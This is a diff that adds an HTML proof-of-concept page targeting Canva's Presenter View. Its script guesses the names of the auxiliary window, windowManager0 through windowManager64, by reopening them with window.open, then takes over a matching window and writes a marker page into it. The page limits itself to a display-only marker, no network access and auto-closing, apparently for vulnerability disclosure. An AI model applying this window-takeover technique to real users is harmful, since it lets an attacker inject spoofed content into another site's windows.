@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; media-src 'none'; font-src 'none'; object-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'">
+  <title>Owned WindowManagement display gate</title>
+  <style>
+    :root { color-scheme: dark; font: 16px/1.5 system-ui, sans-serif; }
+    * { box-sizing: border-box; }
+    body { margin: 0; padding: 24px; background: #0e1518; color: #f5f8fa; }
+    main { max-width: 760px; margin: auto; }
+    button { padding: 12px 16px; font: inherit; font-weight: 700; cursor: pointer; }
+    button:disabled { cursor: default; opacity: .65; }
+    pre { min-height: 8em; white-space: pre-wrap; padding: 16px; border: 1px solid #52606b; background: #050809; }
+  </style>
+</head>
+<body>
+<main>
+  <h1>Owned WindowManagement display gate</h1>
+  <p>
+    One click, one bounded pass scan, and one visible marker at most. No device,
+    clipboard, storage, file, upload, XHR, WebSocket, or beacon API is used.
+  </p>
+  <button id="run" type="button">Run one display-only gate</button>
+  <pre id="status">READY: first open Presenter View and keep its auxiliary window open.</pre>
+</main>
+<script>
+"use strict";
+
+const TARGET_URL =
+  "https://www.canva.com/oauth/__owned_wm_gate__/index.popout.html";
+const FIRST_INDEX = 0;
+const LAST_INDEX = 64;
+const MARKER_DELAY_MS = 400;
+const CLEANUP_DELAY_MS = 15000;
+const runButton = document.querySelector("#run");
+const status = document.querySelector("#status");
+let ownedChild = null;
+let cleanupTimer = null;
+
+function setStatus(kind, lines) {
+  status.textContent = `${kind}: ${lines.join("\n")}`;
+}
+
+function closeOwnedChild(reason) {
+  if (cleanupTimer !== null) {
+    clearTimeout(cleanupTimer);
+    cleanupTimer = null;
+  }
+  if (ownedChild !== null && !ownedChild.closed) {
+    try { ownedChild.close(); } catch (_) {}
+  }
+  if (reason !== null) {
+    status.textContent += `\nCLEANUP: ${reason}`;
+  }
+}
+
+function scheduleCleanup() {
+  cleanupTimer = setTimeout(() => {
+    closeOwnedChild("the single returned child was closed after 15 seconds");
+  }, CLEANUP_DELAY_MS);
+}
+
+runButton.addEventListener("click", () => {
+  runButton.disabled = true;
+  setStatus("RUNNING", [
+    `testing windowManager${FIRST_INDEX}..windowManager${LAST_INDEX} once`,
+    "misses use Canva's internal /oauth branch",
+  ]);
+
+  let matchedName = null;
+  let attempts = 0;
+  for (let index = FIRST_INDEX; index <= LAST_INDEX; index += 1) {
+    attempts += 1;
+    const candidateName = `windowManager${index}`;
+    let candidateChild;
+    try {
+      candidateChild = window.open(
+        TARGET_URL,
+        candidateName,
+        "menubar=no,width=520,height=320",
+      );
+    } catch (error) {
+      setStatus("INCONCLUSIVE", [
+        `window.open threw ${error.name} on attempt ${attempts}`,
+        "no further name was tested",
+      ]);
+      return;
+    }
+    if (candidateChild !== null) {
+      ownedChild = candidateChild;
+      matchedName = candidateName;
+      break;
+    }
+  }
+
+  if (ownedChild === null) {
+    setStatus("NEGATIVE", [
+      `no live pass returned a child in windowManager${FIRST_INDEX}..windowManager${LAST_INDEX}`,
+      `attempts=${attempts}`,
+      "no marker or child cleanup is required",
+    ]);
+    return;
+  }
+
+  try { ownedChild.stop(); } catch (_) {}
+  let blankAssignment = "replace";
+  try {
+    ownedChild.location.replace("about:blank#owned-window-management-gate");
+  } catch (replaceError) {
+    blankAssignment = `replace:${replaceError.name}`;
+    try {
+      ownedChild.location.href = "about:blank#owned-window-management-gate";
+      blankAssignment += ",href:fallback";
+    } catch (hrefError) {
+      blankAssignment += `,href:${hrefError.name}`;
+    }
+  }
+
+  setTimeout(() => {
+    if (ownedChild === null || ownedChild.closed) {
+      setStatus("INCONCLUSIVE", [
+        `a child returned for ${matchedName}, then closed before marker validation`,
+        `attempts=${attempts}`,
+        `blankAssignment=${blankAssignment}`,
+      ]);
+      return;
+    }
+
+    try {
+      ownedChild.document.open();
+      ownedChild.document.write(
+        "<!doctype html><meta charset=utf-8>" +
+        "<meta http-equiv='Content-Security-Policy' content=\"default-src 'none'; style-src 'unsafe-inline'\">" +
+        "<title>Owned WindowManagement marker</title>" +
+        "<body style='margin:0;padding:32px;background:#10251f;color:#f5fff9;font:22px/1.5 system-ui,sans-serif'>" +
+        "<h1 id='owned-wm-marker'>Owned WindowManagement marker</h1>" +
+        "<p>Display-only. No device, clipboard, file, storage, or upload was requested.</p>" +
+        "<p>This child closes automatically after 15 seconds.</p>",
+      );
+      ownedChild.document.close();
+      const marker = ownedChild.document.getElementById("owned-wm-marker");
+      if (marker === null || marker.textContent !== "Owned WindowManagement marker") {
+        throw new Error("marker verification failed");
+      }
+      setStatus("POSITIVE", [
+        `matched=${matchedName}`,
+        `attempts=${attempts}`,
+        `childHref=${ownedChild.location.href}`,
+        "visibleMarker=Owned WindowManagement marker",
+        "cleanupScheduled=15 seconds",
+      ]);
+    } catch (error) {
+      setStatus("INCONCLUSIVE", [
+        `a child returned for ${matchedName}, but marker access failed with ${error.name}`,
+        `attempts=${attempts}`,
+        `blankAssignment=${blankAssignment}`,
+      ]);
+    }
+    scheduleCleanup();
+  }, MARKER_DELAY_MS);
+}, { once: true });
+
+addEventListener("pagehide", () => closeOwnedChild(null), { once: true });
+</script>
+</body>
+</html>
